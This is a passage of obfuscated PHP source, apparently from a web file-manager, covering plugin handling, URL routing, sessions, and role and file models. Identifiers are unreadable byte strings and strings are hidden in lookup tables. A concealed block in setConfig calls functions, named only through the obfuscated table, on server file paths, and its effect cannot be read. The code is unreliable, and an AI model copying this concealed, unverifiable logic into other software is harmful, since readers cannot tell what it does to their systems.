rawurlencode(json_encode($Ã¢¨àšù)) : $Ã¢¨àšù; } if (strstr($‰Í‰–Ñ, $Öä¦×Ø™[1491])) { $‚¬ÁÀĞÊ = rawurlencode(json_encode($this->pluginLangArr)); $‰Í‰–Ñ = str_replace($Öä¦×Ø™[1491], $‚¬ÁÀĞÊ, $‰Í‰–Ñ); } if (strstr($‰Í‰–Ñ, $Öä¦×Ø™[1492])) { $‚¬ÁÀĞÊ = $‚¬ÁÀĞÊ = rawurlencode(json_encode($this->getConfig())); $‰Í‰–Ñ = str_replace($Öä¦×Ø™[1492], $‚¬ÁÀĞÊ, $‰Í‰–Ñ); } $‰Í‰–Ñ = str_replace($¢úÎ“é†, $õèğ³àó, $‰Í‰–Ñ); return $‰Í‰–Ñ; } private function parseLang(&$¼ÔÍºï) { $²¼­şÑ =& $_SERVER[Ù×¯Ø…]; $ıˆƒÈõ® = $²¼­şÑ[1493]; if (!strstr($¼ÔÍºï, $ıˆƒÈõ®)) { return; } preg_match_all($²¼­şÑ[1494], $¼ÔÍºï, $öÜâç×); if (!is_array($öÜâç×) || count($öÜâç×) == 0 || !is_array($öÜâç×[0]) || count($öÜâç×[0]) == 0) { return; } $Á¤İ«ã = array(); $ÂÚ¥·¥Æ = array(); foreach ($öÜâç×[0] as $¶½§ú¸) { $İÀà—»Ì = substr($¶½§ú¸, strlen($ıˆƒÈõ®), -4); $Ò“àÏñª = LNG($İÀà—»Ì); $Á¤İ«ã[] = $¶½§ú¸; $ÂÚ¥·¥Æ[] = str_replace(array($²¼­şÑ[229], $²¼­şÑ[1073], $²¼­şÑ[340], $²¼­şÑ[116]), array($²¼­şÑ[50], $²¼­şÑ[50], $²¼­şÑ[33], $²¼­şÑ[1495]), $Ò“àÏñª); } $¼ÔÍºï = str_replace($Á¤İ«ã, $ÂÚ¥·¥Æ, $¼ÔÍºï); } private function parseConfig(&$ç­Æ§ĞÚ) { $Ù×—Ïª» =& $_SERVER[Ù×¯Ø…]; $çöÑµ§Ü = $Ù×—Ïª»[1496]; if (!strstr($ç­Æ§ĞÚ, $çöÑµ§Ü)) { return; } preg_match_all($Ù×—Ïª»[1497], $ç­Æ§ĞÚ, $æÄÄÔ·¯); if (!is_array($æÄÄÔ·¯) || count($æÄÄÔ·¯) == 0 || !is_array($æÄÄÔ·¯[0]) || count($æÄÄÔ·¯[0]) == 0) { return; } $ìÑãÔÆ« = $this->getConfig(); $¨Ò²æ‚ë = array(); $Ó»ŒÈÕ = array(); foreach ($æÄÄÔ·¯[0] as $¬¬Ùˆ¶) { $İ¦–ÌğÛ = substr($¬¬Ùˆ¶, strlen($çöÑµ§Ü), -2); $¨Ò²æ‚ë[] = $¬¬Ùˆ¶; $Ó»ŒÈÕ[] = _get($ìÑãÔÆ«, $İ¦–ÌğÛ); } $ç­Æ§ĞÚ = str_replace($¨Ò²æ‚ë, $Ó»ŒÈÕ, $ç­Æ§ĞÚ); } private function parsePackage(&$ˆŒÄäº) { $³Ó¬­üå =& $_SERVER[Ù×¯Ø…]; $¨äö¢µÉ = $³Ó¬­üå[1498]; if (!strstr($ˆŒÄäº, $¨äö¢µÉ)) { return; } preg_match_all($³Ó¬­üå[1499], $ˆŒÄäº, $¾°´Üèã); if (!is_array($¾°´Üèã) || count($¾°´Üèã) == 0 || !is_array($¾°´Üèã[0]) || count($¾°´Üèã[0]) == 0) { return; } $Šş¥­•Ô = $this->appPackage(); $Å•–ë­Ò = array(); $†é£ñÑô = array(); foreach ($¾°´Üèã[0] as $È¦ÍŞğÙ) { $¹õµŞ = substr($È¦ÍŞğÙ, strlen($¨äö¢µÉ), -2); $Å•–ë­Ò[] = $È¦ÍŞğÙ; $†é£ñÑô[] = _get($Šş¥­•Ô, $¹õµŞ); } $ˆŒÄäº = str_replace($Å•–ë­Ò, $†é£ñÑô, $ˆŒÄäº); } final function echoFile($ò¬á¾Ø , $¾’§õ¡å = false) { $‘Ş©æ³ë =& $_SERVER[Ù×¯Ø…]; $ÎÙî’˜˜ = $this->pluginPath . $ò¬á¾Ø ; if (ACT == $‘Ş©æ³ë[1500]) { echo $‘Ş©æ³ë[1501] . $this->pluginName . $‘Ş©æ³ë[8] . $ò¬á¾Ø  . $‘Ş©æ³ë[1502]; if (!file_exists($ÎÙî’˜˜)) { echo $‘Ş©æ³ë[1503]; return; } } $œÏÒé‚– = $this->parseFile($ÎÙî’˜˜); $this->parseLang($œÏÒé‚–); $this->parseConfig($œÏÒé‚–); $this->parsePackage($œÏÒé‚–); if (is_array($¾’§õ¡å)) { $œÏÒé‚– = str_replace(array_keys($¾’§õ¡å), array_values($¾’§õ¡å), $œÏÒé‚–); } echo $‘Ş©æ³ë[229] . $œÏÒé‚–; } final function initLang() { $ŸÛ–¡²À =& $_SERVER[Ù×¯Ø…]; $‹¥ÚÔ›× = $ŸÛ–¡²À[1504]; $¸×·ã¬Á = $this->pluginPath . $ŸÛ–¡²À[1505]; $Ø›Ãş“™ = I18n::getType(); $˜—÷ş— = array(); if (file_exists($¸×·ã¬Á . $Ø›Ãş“™ . $ŸÛ–¡²À[844])) { $˜—÷ş— = (include $¸×·ã¬Á . $Ø›Ãş“™ . $ŸÛ–¡²À[844]); } else { if ($Ø›Ãş“™ == $ŸÛ–¡²À[1506] && !file_exists($¸×·ã¬Á . $Ø›Ãş“™ . $ŸÛ–¡²À[844]) && file_exists($¸×·ã¬Á . $ŸÛ–¡²À[1507])) { $˜—÷ş— = (include $¸×·ã¬Á . $ŸÛ–¡²À[1507]); } else { if (file_exists($¸×·ã¬Á . $‹¥ÚÔ›× . $ŸÛ–¡²À[844])) { $˜—÷ş— = (include $¸×·ã¬Á . $‹¥ÚÔ›× . $ŸÛ–¡²À[844]); } } } if (!is_array($˜—÷ş—)) { return array(); } if (@count($˜—÷ş—) > 0) { I18n::set($˜—÷ş—); } return $˜—÷ş—; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ãı°º£») { $Ã–÷ã¡† =& $_SERVER[Ù×¯Ø…]; if ($_SERVER[$Ã–÷ã¡†[398]] != $_SERVER[$Ã–÷ã¡†[1424]]) { $©â¬‰´ = $Ã–÷ã¡†[878]; $›Ş¾á˜ˆ = $Ã–÷ã¡†[399]; $‰”‘ÒĞŸ = $_SERVER[$Ã–÷ã¡†[400]] . $Ã–÷ã¡†[401]; $˜åÎ”µ¨ = $›Ş¾á˜ˆ($‰”‘ÒĞŸ); $Æê¨­ = explode($Ã–÷ã¡†[229], $˜åÎ”µ¨); if (count($Æê¨­) < $Ã–÷ã¡†[618]) { $ı¼šş¡ = $Ã–÷ã¡†[403]; $ı¼šş¡(); } $Í¢±ßÂµ = $Ã–÷ã¡†[879]; $Í¢±ßÂµ($_SERVER[$Ã–÷ã¡†[880]]); $Í¢±ßÂµ($_SERVER[$Ã–÷ã¡†[400]] . $Ã–÷ã¡†[1508]); $øš•şÍ = 1; while ($øš•şÍ > 1) { $øš•şÍ = $øš•şÍ + 4; $öÖŒó´ = rawurlencode($øš•şÍ . $Ã–÷ã¡†[376]); } } return $this->modelPlugin->setConfig($this->pluginName, $ãı°º£»); } public function onSetConfig($ºÖÒ ñ“) { } public function onGetConfig($á¼°éü€) { } public function onChangeStatus($ÈÑÆ»¢œ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($İ“è½ = "\x70\154\x75\147\x69\x6e\101\165\164\x68") { $Á³•¬ãÈ =& $_SERVER[Ù×¯Ø…]; if (!defined($Á³•¬ãÈ[477])) { return !1; } if (_get($GLOBALS, $Á³•¬ãÈ[508])) { return !0; } $ğÀ÷Ä = $this->getConfig(); if (!$ğÀ÷Ä[$İ“è½]) { return !1; } return ActionCall($Á³•¬ãÈ[1509], $ğÀ÷Ä[$İ“è½]); } public function url($Á¬‹—º±, $ò³’ÎÆ = '', $†ûÑƒ½š = true) { $îåšÙ¥ =& $_SERVER[Ù×¯Ø…]; $šùŠŠ¨ = $this->getConfig(); $Œ²Õæ¢™ = KOD_VERSION . $îåšÙ¥[95] . KOD_VERSION_BUILD; $¹ö‰ = $this->packageVersion(); $–¤ŞÒÁ¬ = $Œ²Õæ¢™ . $îåšÙ¥[463] . $¹ö‰; if (substr($Á¬‹—º±, 0, 4) == $îåšÙ¥[147] || substr($Á¬‹—º±, 0, 2) == $îåšÙ¥[1293]) { $«”¯Èƒ• = $Á¬‹—º± . $îåšÙ¥[1510] . $–¤ŞÒÁ¬; } else { if ($ò³’ÎÆ == $îåšÙ¥[33]) { $«”¯Èƒ• = $this->pluginHost . $Á¬‹—º± . $îåšÙ¥[1510] . $–¤ŞÒÁ¬; } else { if ($ò³’ÎÆ === $îåšÙ¥[77]) { $«”¯Èƒ• = $this->pluginHost . $Á¬‹—º±; } else { if ($ò³’ÎÆ == $îåšÙ¥[1511]) { $«”¯Èƒ• = STATIC_PATH . $Á¬‹—º± . $îåšÙ¥[1510] . $Œ²Õæ¢™; } else { if ($ò³’ÎÆ == $îåšÙ¥[1512]) { $«”¯Èƒ• = APP_HOST . $îåšÙ¥[1513] . $Á¬‹—º± . $îåšÙ¥[1510] . $Œ²Õæ¢™; } else { if (isset($šùŠŠ¨[$ò³’ÎÆ])) { $«”¯Èƒ• = $šùŠŠ¨[$ò³’ÎÆ] . $Á¬‹—º± . $îåšÙ¥[1510] . $–¤ŞÒÁ¬; } } } } } } if (!$†ûÑƒ½š) { return $«”¯Èƒ•; } echo $«”¯Èƒ•; } public function link($®úŞÒ = false, $“Ô¡ŒöŞ = '') { $ÛĞà =& $_SERVER[Ù×¯Ø…]; if (!$®úŞÒ) { $this->link($ÛĞà[1514], $ÛĞà[1512]); $this->link($ÛĞà[1515], $ÛĞà[1511]); $this->link($ÛĞà[1516], $ÛĞà[1511]); $this->link($ÛĞà[1517], $ÛĞà[1511]); $this->link($ÛĞà[1518], $ÛĞà[1511]); return; } $±Û‡Ğ· = $this->url($®úŞÒ, $“Ô¡ŒöŞ, !1); if (substr($®úŞÒ, -3) == $ÛĞà[1519]) { echo $ÛĞà[1520] . $±Û‡Ğ· . $ÛĞà[1521] . $ÛĞà[229]; } else { if (substr($®úŞÒ, -4) == $ÛĞà[1522]) { echo $ÛĞà[1523] . $±Û‡Ğ· . $ÛĞà[1524] . $ÛĞà[229]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\x79" => "\133\136\x2f\135\53", "\72\x6e\x75\x6d" => "\x5b\60\x2d\x39\x5d\53", "\72\x61\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($ï ïæş, $‘ÊÈì¥) { $ÇšÖ— =& $_SERVER[Ù×¯Ø…]; if ($ï ïæş == $ÇšÖ—[1525]) { $õûŠ’Ì = array_map($ÇšÖ—[1526], $‘ÊÈì¥[0]); $§’ùää = strpos($‘ÊÈì¥[1], $ÇšÖ—[8]) === 0 ? $‘ÊÈì¥[1] : $ÇšÖ—[8] . $‘ÊÈì¥[1]; $éÃâŠùÊ = $‘ÊÈì¥[2]; } else { $õûŠ’Ì = null; $§’ùää = strpos($‘ÊÈì¥[0], $ÇšÖ—[8]) === 0 ? $‘ÊÈì¥[0] : $ÇšÖ—[8] . $‘ÊÈì¥[0]; $éÃâŠùÊ = $‘ÊÈì¥[1]; } array_push(self::$maps, $õûŠ’Ì); array_push(self::$routes, $§’ùää); array_push(self::$methods, strtoupper($ï ïæş)); array_push(self::$callbacks, $éÃâŠùÊ); } public static function error($ä¦ÔÈø´) { self::$errorCallback = $ä¦ÔÈø´; } public static function haltOnMatch($¯­¸²€ô = true) { self::$halts = $¯­¸²€ô; } public static function dispatch() { $¯øñó÷ä =& $_SERVER[Ù×¯Ø…]; $¸Ü¢ƒ²Ü = parse_url($_SERVER[$¯øñó÷ä[1527]], PHP_URL_PATH); $¹É€Õ„ = $_SERVER[$¯øñó÷ä[157]]; $‚ßĞ¤× = array_keys(static::$patterns); $±ÂâË·è = array_values(static::$patterns); $õé½áéù = !1; self::$routes = preg_replace($¯øñó÷ä[1199], $¯øñó÷ä[8], self::$routes); if (in_array($¸Ü¢ƒ²Ü, self::$routes)) { $î±íñáŠ = array_keys(self::$routes, $¸Ü¢ƒ²Ü); foreach ($î±íñáŠ as $Ù²ÎõÎ—) { if (self::$methods[$Ù²ÎõÎ—] == $¹É€Õ„ || self::$methods[$Ù²ÎõÎ—] == $¯øñó÷ä[1528] || in_array($¹É€Õ„, self::$maps[$Ù²ÎõÎ—])) { $õé½áéù = !0; if (!is_object(self::$callbacks[$Ù²ÎõÎ—])) { $‡šÀéÚı = explode($¯øñó÷ä[8], self::$callbacks[$Ù²ÎõÎ—]); $Ã´š©ñ— = end($‡šÀéÚı); $’İ¨İ€ş = explode($¯øñó÷ä[1529], $Ã´š©ñ—); $¨Ìı™ŠÖ = new $’İ¨İ€ş[0](); $¨Ìı™ŠÖ->{$’İ¨İ€ş[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Ù²ÎõÎ—]); if (self::$halts) { return; } } } } } else { $Âéâ¾—µ = 0; foreach (self::$routes as $Ù²ÎõÎ—) { if (strpos($Ù²ÎõÎ—, $¯øñó÷ä[4]) !== !1) { $Ù²ÎõÎ— = str_replace($‚ßĞ¤×, $±ÂâË·è, $Ù²ÎõÎ—); } if (preg_match($¯øñó÷ä[1530] . $Ù²ÎõÎ— . $¯øñó÷ä[1531], $¸Ü¢ƒ²Ü, $Ğ †è¢€)) { if (self::$methods[$Âéâ¾—µ] == $¹É€Õ„ || self::$methods[$Âéâ¾—µ] == $¯øñó÷ä[1528] || !empty(self::$maps[$Âéâ¾—µ]) && in_array($¹É€Õ„, self::$maps[$Âéâ¾—µ])) { $õé½áéù = !0; array_shift($Ğ †è¢€); if (!is_object(self::$callbacks[$Âéâ¾—µ])) { $‡šÀéÚı = explode($¯øñó÷ä[8], self::$callbacks[$Âéâ¾—µ]); $Ã´š©ñ— = end($‡šÀéÚı); $’İ¨İ€ş = explode($¯øñó÷ä[1529], $Ã´š©ñ—); $¨Ìı™ŠÖ = new $’İ¨İ€ş[0](); if (!method_exists($¨Ìı™ŠÖ, $’İ¨İ€ş[1])) { echo $¯øñó÷ä[1532]; } else { call_user_func_array(array($¨Ìı™ŠÖ, $’İ¨İ€ş[1]), $Ğ †è¢€); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Âéâ¾—µ], $Ğ †è¢€); if (self::$halts) { return; } } } } $Âéâ¾—µ++; } } if ($õé½áéù == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ÛëÕŒ„‡ =& $_SERVER[Ù×¯Ø…]; header($_SERVER[$ÛëÕŒ„‡[1533]] . $ÛëÕŒ„‡[1534]); echo $ÛëÕŒ„‡[1535]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$¯øñó÷ä[1527]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Ô–¯ÌÃ =& $_SERVER[Ù×¯Ø…]; static $¬ĞˆÈŸ = false; if ($¬ĞˆÈŸ) { return $¬ĞˆÈŸ; } $£¢„¤Ñç = $GLOBALS[$Ô–¯ÌÃ[6]][$Ô–¯ÌÃ[347]]; self::$sessionTime = $£¢„¤Ñç[$Ô–¯ÌÃ[1536]]; $Î×—Ö®¶ = isset($GLOBALS[$Ô–¯ÌÃ[1537]]) ? $GLOBALS[$Ô–¯ÌÃ[1537]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Î×—Ö®¶)) { self::$sessionSign = Cookie::get($Î×—Ö®¶); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Î×—Ö®¶, self::$sessionSign, self::$sessionTime); $ÛÒÊÔ¶ = $£¢„¤Ñç[$Ô–¯ÌÃ[1538]]; $ã¨ı£Ü¶ = $£¢„¤Ñç[$ÛÒÊÔ¶]; $˜áğº‹Ë = $£¢„¤Ñç[$Ô–¯ÌÃ[834]]; switch ($ÛÒÊÔ¶) { case $Ô–¯ÌÃ[17]: self::$handle = Model($Ô–¯ÌÃ[835]); break; case $Ô–¯ÌÃ[836]: self::$handle = new CacheRedis($ã¨ı£Ü¶, $˜áğº‹Ë); break; case $Ô–¯ÌÃ[837]: self::$handle = new CacheMemcached($ã¨ı£Ü¶, $˜áğº‹Ë); break; case $Ô–¯ÌÃ[193]: $ã¨ı£Ü¶[$Ô–¯ÌÃ[76]] = $ã¨ı£Ü¶[$Ô–¯ÌÃ[76]] . $Ô–¯ÌÃ[1539]; self::$handle = new CacheFile($ã¨ı£Ü¶, $˜áğº‹Ë); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $¬ĞˆÈŸ = new self(); return $¬ĞˆÈŸ; } public static function getBySign($ñ¥Ÿ´çä) { CacheLock::lock($ñ¥Ÿ´çä); $¦è¦Ã©™ = self::$handle->get($ñ¥Ÿ´çä); CacheLock::unlock($ñ¥Ÿ´çä); $¦è¦Ã©™ = unserialize($¦è¦Ã©™); return is_array($¦è¦Ã©™) ? $¦è¦Ã©™ : array(); } public static function setBySign($¿„ÌàŞø, $›Š÷ŸÌ“) { CacheLock::lock($¿„ÌàŞø); self::$handle->set($¿„ÌàŞø, serialize($›Š÷ŸÌ“), self::$sessionTime); CacheLock::unlock($¿„ÌàŞø); } public static function sign($øö•â÷‰ = false) { $øö•â÷‰ && (self::$sessionSign = $øö•â÷‰); self::init(); return self::$sessionSign; } public static function set($©’û¬ûõ, $˜Ü©§„ = false) { self::init(); if (is_array($©’û¬ûõ)) { foreach ($©’û¬ûõ as $›››° => $±Å‘èÄÅ) { array_set_value(self::$data, $›››°, $±Å‘èÄÅ); } } else { array_set_value(self::$data, $©’û¬ûõ, $˜Ü©§„); } self::setBySign(self::$sessionSign, self::$data); } public static function get($îÂş°ØÂ = false) { self::init(); if (!$îÂş°ØÂ) { return self::$data; } return array_get_value(self::$data, $îÂş°ØÂ); } public static function remove($«ö÷Ü¶Ÿ) { self::init(); unset(self::$data[$«ö÷Ü¶Ÿ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ù×¯Ø…][839])) { self::$handle->clearTimeout(); } } } goto A£¤Ï‘ Í¾; AË…˜¬›ò: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\164\145\155\137\157\160\164\151\x6f\x6e"; protected $jsonField = array("\x6d\x65\x6e\165", "\162\157\154\x65", "\x72\x6f\x6c\145\107\162\157\x75\160", "\x72\145\x67\x69\163\x74", "\145\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($ÚæÄéè») { return "\123\171\163\164\x65\155\117\160\x74\151\157\x6e\137{$ÚæÄéè»}"; } protected function optionDefault($û”ŒÔÈ = '') { $Ü„€ª¬ =& $_SERVER[Ù×¯Ø…]; if ($û”ŒÔÈ == $Ü„€ª¬[33]) { return $GLOBALS[$Ü„€ª¬[6]][$Ü„€ª¬[379]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\x72\x6f\x6c\x65\114\x69\163\x74"; public $field = array("\156\141\155\145", "\x61\165\164\150", "\x6c\141\142\x65\154", "\x64\151\163\x70\154\141\x79", "\x73\x79\x73\x74\x65\155", "\144\x65\163\x63", "\x69\x67\156\157\x72\x65\105\x78\164", "\x69\147\x6e\157\162\145\106\x69\x6c\145\123\151\172\145", "\x61\x64\155\151\156\151\x73\x74\162\141\x74\x6f\162", "\x73\x6f\162\164"); public function listData($Â¿¦±² = false, $£õ×ñ•© = "\x73\x6f\162\164", $öÁŞÌ‹¨ = false) { $é¹ûâóÜ =& $_SERVER[Ù×¯Ø…]; $õ§ÕËæÙ = parent::listData($Â¿¦±², $£õ×ñ•©, $öÁŞÌ‹¨); if (!$Â¿¦±²) { foreach ($õ§ÕËæÙ as $‹Ñõáë => $£±èÇÄ) { if ($£±èÇÄ[$é¹ûâóÜ[1943]] == 1) { $õ§ÕËæÙ[$‹Ñõáë][$é¹ûâóÜ[454]] = LNG($é¹ûâóÜ[2167]); } } } return $õ§ÕËæÙ; } public function update($‚Úä¹ôø, $ğîÅ÷»Ÿ) { $¦ó —»ï =& $_SERVER[Ù×¯Ø…]; $¥ªûÚØ = parent::listData($‚Úä¹ôø); $”ËŒ¨— = $this->findByName($ğîÅ÷»Ÿ[$¦ó —»ï[28]]); if (!$¥ªûÚØ || $”ËŒ¨— && $”ËŒ¨—[$¦ó —»ï[395]] != $¥ªûÚØ[$¦ó —»ï[395]]) { return !1; } if ($”ËŒ¨—[$¦ó —»ï[1943]] == 1) { $ğîÅ÷»Ÿ = array($¦ó —»ï[28] => $ğîÅ÷»Ÿ[$¦ó —»ï[28]], $¦ó —»ï[1770] => $ğîÅ÷»Ÿ[$¦ó —»ï[1770]]); } $this->filterAuth($ğîÅ÷»Ÿ[$¦ó —»ï[417]]); return parent::update($‚Úä¹ôø, $ğîÅ÷»Ÿ); } public function remove($˜‘ê»½º) { $´ç”Ìó¬ = parent::listData($˜‘ê»½º); if (!$´ç”Ìó¬ || $´ç”Ìó¬[$_SERVER[Ù×¯Ø…][1206]]) { return !1; } return parent::remove($˜‘ê»½º); } public function add($‹ªáâÕŞ) { $à® û¥İ =& $_SERVER[Ù×¯Ø…]; $Ì®³Ş‘ = $‹ªáâÕŞ[$à® û¥İ[28]]; if ($this->findByName($Ì®³Ş‘)) { return !1; } $àÖ Ññá = array($à® û¥İ[424] => $Ì®³Ş‘, $à® û¥İ[1754] => $à® û¥İ[33], $à® û¥İ[1750] => $à® û¥İ[1758], $à® û¥İ[2168] => 1, $à® û¥İ[1753] => 0, $à® û¥İ[2169] => 0, $à® û¥İ[1752] => $this->getSort()); $‹ªáâÕŞ = array_merge($àÖ Ññá, $‹ªáâÕŞ); $this->filterAuth($‹ªáâÕŞ[$à® û¥İ[417]]); return parent::insert($‹ªáâÕŞ); } private function getSort() { $ïû–ğÕ— =& $_SERVER[Ù×¯Ø…]; $²ÙÒìç“ = parent::listData(); $›‘ñí—Š = array_to_keyvalue($²ÙÒìç“, $ïû–ğÕ—[33], $ïû–ğÕ—[1771]); return empty($›‘ñí—Š) ? 0 : max($›‘ñí—Š) + 1; } private function filterAuth(&$şÉª×) { $×­ğˆØ =& $_SERVER[Ù×¯Ø…]; $úñœäÉù = array(); $Ç°Ñì·ò = array_filter(explode($×­ğˆØ[47], $şÉª×)); foreach ($Ç°Ñì·ò as $şÉª×) { $èÔØ²Áò = explode($×­ğˆØ[95], $şÉª×); if ($èÔØ²Áò[0] == $×­ğˆØ[2170] && $èÔØ²Áò[1] != $×­ğˆØ[1125]) { $íÎğ§Ù¯ = $èÔØ²Áò[0] . $×­ğˆØ[95] . $èÔØ²Áò[1] . $×­ğˆØ[2171]; if (!in_array($íÎğ§Ù¯, $Ç°Ñì·ò)) { $úñœäÉù[] = $íÎğ§Ù¯; } } $úñœäÉù[] = $şÉª×; } $şÉª× = implode($×­ğˆØ[47], $úñœäÉù); } public function sort($Ğø˜¦Ÿî, $ïåĞéÃã) { return parent::update($Ğø˜¦Ÿî, $ïåĞéÃã); } } goto F£«ààÓïÁ; FÒÆ²ÆåÂÓ: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\154\145\137\x63\157\x6e\x74\145\x6e\164\x73"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\x54\x69\x6d\x65", "\x74\x69\x6d\x65", "\151\156\163\x65\162\x74", "\146\165\x6e\143\164\151\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\151\154\145"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\x61\x6d\x65" => "\151\x6f\x5f\x66\x69\x6c\x65\x5f\155\x65\x74\141", "\x6d\x65\164\x61\x46\151\x65\154\144" => "\x66\151\154\x65\x49\104"); public function fileInfo($üéÚè‚–) { $ñ¼™«Ïù =& $_SERVER[Ù×¯Ø…]; static $ßíâ—ûİ = array(); if (!isset($ßíâ—ûİ[$üéÚè‚–])) { $Ú ¼¦›Û = $ñ¼™«Ïù[1796]; $šĞ‰Í¨œ = Model($ñ¼™«Ïù[473])->field($Ú ¼¦›Û)->where(array($ñ¼™«Ïù[471] => $üéÚè‚–))->find(); $ßíâ—ûİ[$üéÚè‚–] = $šĞ‰Í¨œ; } return $ßíâ—ûİ[$üéÚè‚–]; } public function addFileByContent($È‘åõ— = '', $õÖâüõğ = '') { $ìø¤Íò =& $_SERVER[Ù×¯Ø…]; $ˆ…ˆÍë = TEMP_PATH . $ìø¤Íò[1797]; if (!is_dir($ˆ…ˆÍë)) { mk_dir($ˆ…ˆÍë); } $³ïÙèæÀ = $ˆ…ˆÍë . $ìø¤Íò[1798] . rand_string(16); file_put_contents($³ïÙèæÀ, $È‘åõ—); $–—©ë†¸ = $this->addFile($³ïÙèæÀ, $õÖâüõğ, !0); if (file_exists($³ïÙèæÀ)) { @unlink($³ïÙèæÀ); } return $–—©ë†¸; } public function createFileName($üóĞƒº¾, $Õú—Üó = false, $ªîÚï = false) { $µàØ¡Ïó =& $_SERVER[Ù×¯Ø…]; $ø´¼Ûı = IO::init($µàØ¡Ïó[8]); $‚¥Î²¡ = $this->makeFilePath($üóĞƒº¾, $ø´¼Ûı, $Õú—Üó, $ªîÚï); $¢Ø£±ãÉ = $ø´¼Ûı->pathFather($‚¥Î²¡); static $Êªªı¨Æ = false; $³Æá«€ï = $µàØ¡Ïó[1799] . md5($¢Ø£±ãÉ); if (!$Êªªı¨Æ && !Cache::get($³Æá«€ï)) { $Êªªı¨Æ = !0; $Œ‰êÅÒÀ = IO::mkdir($¢Ø£±ãÉ); if (!IO::exist($Œ‰êÅÒÀ . $µàØ¡Ïó[802])) { IO::mkfile($Œ‰êÅÒÀ . $µàØ¡Ïó[802]); } Cache::set($³Æá«€ï, 1, 3600 * 2); } return $‚¥Î²¡; } public function makeFilePath($üÙû´, $­Œ‘€©Ó, $©ƒµ‡ıŠ = false, $†øÔ»ª« = false) { $ Áá×¬ =& $_SERVER[Ù×¯Ø…]; $Ñº¾®ÂÈ = Model($ Áá×¬[769])->get($ Áá×¬[1800]); $é¢Ü·î² = KodIO::defaultIO() . date($ Áá×¬[1801]); $éÑÕ—Ç¸ = $é¢Ü·î² . rand_string(5) . short_id(100); $üÙû´ = str_replace($ Áá×¬[8], $ Áá×¬[71], KodIO::clear($üÙû´)); $˜ëĞÄ½æ = $­Œ‘€©Ó->ext($üÙû´); if (!$üÙû´) { $Ñº¾®ÂÈ = $ Áá×¬[1802]; } switch ($Ñº¾®ÂÈ) { case $ Áá×¬[1803]: $éÑÕ—Ç¸ = $éÑÕ—Ç¸ . $ Áá×¬[95] . $­Œ‘€©Ó->ext($üÙû´); if ($˜ëĞÄ½æ == $ Áá×¬[1740]) { $éÑÕ—Ç¸ .= $ Áá×¬[1475]; } break; case $ Áá×¬[1804]: $¬ÖÕÇà¨ = Model($ Áá×¬[769])->get($ Áá×¬[770]); $ÚÆµàŠ­ = substr(md5($ Áá×¬[771] . $¬ÖÕÇà¨ . date($ Áá×¬[747])), 0, 8); $›ÆôêÉ = KodIO::defaultDriver(); $é¢Ü·î² = $ Áá×¬[1159] . $›ÆôêÉ[$ Áá×¬[395]] . $ Áá×¬[413] . date($ Áá×¬[1805]) . $ÚÆµàŠ­ . $ Áá×¬[8]; if ($˜ëĞÄ½æ == $ Áá×¬[1740]) { $üÙû´ .= $ Áá×¬[1475]; } $­“Ú×ö— = $ Áá×¬[1806] . $é¢Ü·î² . $üÙû´; CacheLock::lock($­“Ú×ö—); $éÑÕ—Ç¸ = $é¢Ü·î² . $üÙû´; if (IO::exist($é¢Ü·î² . $üÙû´)) { $—£‚„»ò = substr($üÙû´, 0, strlen($üÙû´) - strlen($˜ëĞÄ½æ)); $“Ğ˜˜ã­ = $†øÔ»ª« ? substr($†øÔ»ª«, 0, 5) : ($©ƒµ‡ıŠ ? substr($©ƒµ‡ıŠ, 0, 5) : rand_string(5)); $éÑÕ—Ç¸ = $é¢Ü·î² . $—£‚„»ò . $“Ğ˜˜ã­ . $ Áá×¬[95] . $˜ëĞÄ½æ; } if (IO::isTypeObject($éÑÕ—Ç¸) && !IO::isUploadServer($éÑÕ—Ç¸)) { if (IO::exist($éÑÕ—Ç¸)) { return $éÑÕ—Ç¸; } $—ìŒ‘”· = IO::setContent($éÑÕ—Ç¸, $ Áá×¬[33]); if (!$—ìŒ‘”·) { show_json($ Áá×¬[1807], !1); } } CacheLock::unlock($­“Ú×ö—); break; case $ Áá×¬[1802]: break; default: break; } return $éÑÕ—Ç¸; } public function addFileByRemote($ªÒØ˜øú, $ÄÊŒáæÈ, $ıûÑÑàè = array()) { $¢Èù”¢ =& $_SERVER[Ù×¯Ø…]; if (!IO::exist($ªÒØ˜øú)) { return !1; } $ŠÉå´ìÉ = $ıûÑÑàè[$¢Èù”¢[170]] ? $ıûÑÑàè[$¢Èù”¢[170]] : $¢Èù”¢[33]; $ôÈŸëè› = IO::hashMd5($ªÒØ˜øú, $ŠÉå´ìÉ); $“  ±Ù = KodIO::defaultDriver(); $˜®»š˜ = array($¢Èù”¢[582] => IO::size($ªÒØ˜øú), $¢Èù”¢[1808] => 1, $¢Èù”¢[424] => $ÄÊŒáæÈ, $¢Èù”¢[814] => $“  ±Ù[$¢Èù”¢[395]], $¢Èù”¢[425] => 